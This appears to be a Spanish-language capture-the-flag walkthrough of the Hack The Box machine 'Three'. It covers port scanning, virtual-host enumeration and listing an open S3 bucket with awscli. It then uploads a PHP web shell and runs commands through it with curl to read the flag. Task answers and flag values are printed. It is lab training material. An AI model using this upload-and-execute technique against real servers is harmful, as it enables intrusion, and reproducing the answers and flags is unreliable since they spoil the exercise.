## 0. Conectividad Inicial
Establecemos la conexión VPN y preparamos el entorno de trabajo.

```bash
# Iniciar conexión VPN
sudo openvpn starting_points_eu-starting-point-1-dhcp.ovpn

# Configurar IP del objetivo y comprobar conectividad
settarget 10.129.58.180 THREE
ping 10.129.58.180
nmap -sn 10.129.58.180
```

---

## 1. Fase de Tareas (Tasks)

### **Task 1: How many TCP ports are open?**
Realizamos un escaneo profundo de puertos:
```bash
nmap -p- --open --min-rate 5000 -A -sS -Pn -n -vvv 10.129.58.180

# Opción más rápida:
nmap -F 10.129.58.180
```
> **Respuesta:** 2 (22/tcp y 80/tcp)

### **Task 2: What is the domain of the email address provided in the "Contact" section of the website?**
Al navegar por la web en el puerto 80, localizamos el correo en la sección de contacto.
> **Respuesta:** `thetoppers.htb`

### **Task 3: In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses?**
```bash
find / -iname "hosts" 2>/dev/null
```
> **Respuesta:** `/etc/hosts`

### **Task 4: Which sub-domain is discovered during further enumeration?**
Primero intentamos enumeración de directorios, pero luego pasamos a **vhosts** tras añadir el dominio al archivo hosts.

```bash
# Intento inicial de directorios
gobuster dir -u http://10.129.58.180/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Configuración necesaria en /etc/hosts
sudo nano /etc/hosts
# Añadir: 10.129.58.180  thetoppers.htb

# Enumeración de Virtual Hosts
gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
> **Respuesta:** `s3.thetoppers.htb`

### **Task 5: Which service is running on the discovered sub-domain?**
El nombre "s3" y los resultados de `curl` y `whatweb` nos indican el servicio. Aunque el servidor responda con JSON/Hypercorn, el subdominio delata la tecnología simulada.
> **Respuesta:** `Amazon S3`

### **Task 6: Which command line utility can be used to interact with the service running on the discovered sub-domain?**
Instalamos la herramienta necesaria:
```bash
sudo apt install awscli
```
> **Respuesta:** `awscli`

### **Task 7: Which command is used to set up the AWS CLI installation?**
Usamos `tldr` para consultar la ayuda rápida y encontrar el comando de configuración:
```bash
tldr aws
```
> **Respuesta:** `aws configure`

### **Task 8: What is the command used by the above utility to list all of the S3 buckets?**
De forma similar al comando `ls` en Linux.
> **Respuesta:** `aws s3 ls`

### **Task 9: This server is configured to run files written in what web scripting language?**
Añadimos el subdominio a `/etc/hosts` y listamos el contenido del bucket:
```bash
# En /etc/hosts añadir: 10.129.58.180  s3.thetoppers.htb

aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb
```
Al ver archivos con extensión `.php` en el listado:
> **Respuesta:** `php`

---

## 2. Explotación y Obtención de la Flag

### **Paso 1: Creación de la WebShell**
Creamos un archivo llamado `shell.php` para ejecución remota de comandos:

![[Pasted image 20260403170242.png]]

### **Paso 2: Subida al Bucket**
Subimos el archivo aprovechando la configuración del S3:
```bash
aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php s3://thetoppers.htb
```

### **Paso 3: Ejecución y Búsqueda de la Flag**
Verificamos la subida y exploramos el servidor:
```bash
# Listar archivos para confirmar presencia de shell.php
aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb

# Ejecutar comandos vía navegador o curl
# Comprobar directorio actual:
curl http://thetoppers.htb/shell.php?cmd=ls

# Listar directorio superior para encontrar la flag:
curl http://thetoppers.htb/shell.php?cmd=ls+../
```

### **Paso 4: Lectura de la Flag**
```bash
curl http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
```

> **Flag user final:** `f2c74ee8db7983851ab2a96a44eb7981`
> Flag root: `af13b0bee69f8a877c3faf667f7beacf`

---

